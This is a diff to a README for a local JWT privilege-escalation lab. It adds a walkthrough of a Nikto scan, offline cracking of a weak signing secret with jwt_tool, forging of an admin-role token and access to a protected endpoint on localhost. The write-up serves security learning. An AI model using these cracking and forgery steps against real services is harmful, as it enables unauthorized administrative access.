@@ -54,7 +54,7 @@ jwt-privilege-escalation-lab/
 │   └── workflow.md     # reproducible steps + observations
 ├── docs/
 │   └── threat-model.md
-└── screenshots/        # (optional) proof screenshots
+└── screenshots/        #  proof screenshots
 ```
 
 ---
@@ -104,6 +104,40 @@ Admin endpoint:
 curl -i http://127.0.0.1:8080/admin \
   -H "Authorization: Bearer <TOKEN>"
 ```
+
+---
+
+## 🕵️ Attack Walkthrough (The Exploitation)
+
+### 1. Automated Reconnaissance (Nikto)
+I utilized Nikto to scan for misconfigurations and information disclosure.
+\`\`\`bash
+nikto -h http://127.0.0.1:8080
+\`\`\`
+**Findings:** The server logs revealed active directory fuzzing:
+> `404 - 127.0.0.1 - - [26/Feb/2026 10:44:17] "GET /mail9.box HTTP/1.1"`
+Additionally, the scan confirmed the server was leaking exact Werkzeug/Python version headers and missing critical CSP/HSTS security headers.
+
+### 2. Secret Cracking (jwt_tool)
+After obtaining a standard user token, I executed an offline dictionary attack using a targeted OSINT wordlist to discover the weak `JWT_SECRET`.
+\`\`\`bash
+python3 jwt_tool.py <USER_TOKEN> -C -d smart_wordlist.txt
+\`\`\`
+**Result:** `[+] KEY FOUND! [dev-weak-secret]`
+
+### 3. Privilege Escalation (Payload Tampering)
+With the signing key compromised, I forged a new token, escalating the `role` claim to `admin` and re-signing it via HS256.
+\`\`\`bash
+python3 jwt_tool.py <USER_TOKEN> -T -S hs256 -p "dev-weak-secret"
+# Changed 'role' -> 'admin' and 'sub' -> '1'
+\`\`\`
+
+### 4. Bypassing Authorization
+Sending the forged token granted unauthorized access to the restricted endpoint.
+\`\`\`bash
+curl -i http://127.0.0.1:8080/admin -H "Authorization: Bearer <FORGED_TOKEN>"
+\`\`\`
+**Result:** `Admin panel: only admin should see this.`
 
 ---
 
